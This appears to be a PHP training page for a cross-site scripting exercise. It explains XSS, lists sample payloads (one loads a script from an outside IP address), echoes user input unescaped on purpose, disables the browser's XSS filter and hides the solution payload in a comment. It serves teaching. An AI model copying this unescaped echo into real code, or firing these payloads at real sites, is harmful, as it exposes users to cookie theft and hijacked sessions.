<?php
session_start();
header('X-XSS-Protection: 0');
?>

<!DOCTYPE html>
<html>
	<head>
		<title>OSIRIS Giraffe - XSS</title>
	</head>
	<body>
		<h2>Cross Site Scripting</h2>
		<div>
			<p>
			Cross Site Scripting (XSS) occurs when a site renders input
			provided to the site without filtering it for characters 
			which another user's browser may interpret as being valid site markup.</p>
			<p>
			Typically XSS is exploited by an attacker using a JavaScript payload
			to send themselves another user's cookie, submit actions on another
			user's behalf, or defacing pages.</p>
		</div>
		<div>
			<p>
			Here are some common XSS payloads:</p>
			<?php
			$payloads = array('<script>alert(0)</script>', '<script src=//54.243.84.85/new_nyan.js></script>', 
				'<img src=x onerror=alert(0)> ', '<a onclick=alert()>A');
			foreach ($payloads as &$payload) {
				$payload = htmlentities($payload);
				echo("<code>".$payload."</code><br/>");
			}
			?>
		</div>
		<div style="float:left; width: 49%;">
			<p>
			Try landing some XSS on the input below. </p>

			<form method="GET">
				<input type="text" name="xss">
				<input type="submit">
			</form >
			<?php
				if(isset($_GET['xss'])){
					echo('You entered:');
					echo($_GET['xss']);
					echo('<br/><br/>'.'If you\'re not sure why your XSS payload isn\'t working you should look at the page source. Usually you can see it with Ctrl+U');
				}
			?>

			<p>If you think you're good enough with XSS, try using the form above to change this cat image into a giraffe image.</p>
			<?php
			// <script>window.onload=function(){document.getElementById("cat").src="http://i.imgur.com/6K8O2w4.gif";}<%2Fscript>ssss
			?>
			<img width="200px" height="200px" id="cat" src="http://i.imgur.com/2IMozHO.jpg">
		</div>
<pre style="float:left; width:49%; ">
<code>
&lt;div&gt;
    &lt;p&gt;
    Try landing some XSS on the input below. &lt;/p&gt;

    &lt;form method=&quot;GET&quot;&gt;
        &lt;input type=&quot;text&quot; name=&quot;xss&quot;&gt;
    &lt;/form &gt;
    &lt;?php
        if(isset($_GET[&#39;xss&#39;])){
            echo(&#39;You entered:&#39;);
            echo($_GET[&#39;xss&#39;]);
            echo(&#39;&lt;br/&gt;&lt;br/&gt;&#39;.&#39;If you\&#39;re not sure 
            why your XSS payload isn\&#39;t working you should look at the page source. 
            Usually you can see it with Ctrl+U&#39;);
        }
    ?&gt;

    &lt;p&gt;If you think you&#39;re good enough with XSS, try using the form 
    above to change this cat image into a giraffe image.&lt;/p&gt;
    &lt;img width=&quot;200px&quot; height=&quot;200px&quot; id=&quot;cat&quot; src=&quot;http://i.imgur.com/2IMozHO.jpg&quot;&gt;
&lt;/div&gt;
</pre>
</code>
	</body>
</html>
